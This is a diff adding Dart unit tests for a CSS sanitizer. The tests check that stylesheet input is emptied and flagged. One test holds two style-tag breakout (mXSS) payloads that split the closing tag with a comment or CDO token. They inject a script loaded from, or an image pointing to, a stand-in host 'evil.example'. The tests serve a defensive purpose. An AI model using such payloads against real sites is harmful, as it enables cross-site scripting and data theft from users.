@@ -172,5 +172,39 @@ void main() {
         expect(res.css, contains('background: transparent'));
       },
     );
+
+    test('blocks <style> breakout / mXSS payloads via comment-split or CDO/CDC tokens', () {
+      const commentBreakout =
+          '.a { font-family: </*x*/style><script src="https://evil.example/a.js"></script>; }';
+      final r1 = sanitizeCssStylesheet(commentBreakout);
+      expect(r1.css, isEmpty);
+      expect(r1.css, isNot(contains('<')));
+      expect(
+        r1.diagnostics.map((d) => d.code),
+        contains(DiagnosticCode.disallowedAttr),
+      );
+
+      const cdoBreakout =
+          '.a { font-family: </<!-- -->style><img src="https://evil.example/leak">; }';
+      final r2 = sanitizeCssStylesheet(cdoBreakout);
+      expect(r2.css, isEmpty);
+      expect(r2.css, isNot(contains('<')));
+      expect(
+        r2.diagnostics.map((d) => d.code),
+        contains(DiagnosticCode.disallowedAttr),
+      );
+    });
+
+    test('emits diagnostic on empty var(--blink-*, ) fallback', () {
+      final res = sanitizeCssInlineStyle(
+        'color: var(--blink-text-primary, )',
+        ownerTag: 'p',
+      );
+      expect(res.css, isEmpty);
+      expect(
+        res.diagnostics.map((d) => d.code),
+        contains(DiagnosticCode.disallowedAttr),
+      );
+    });
   });
 }
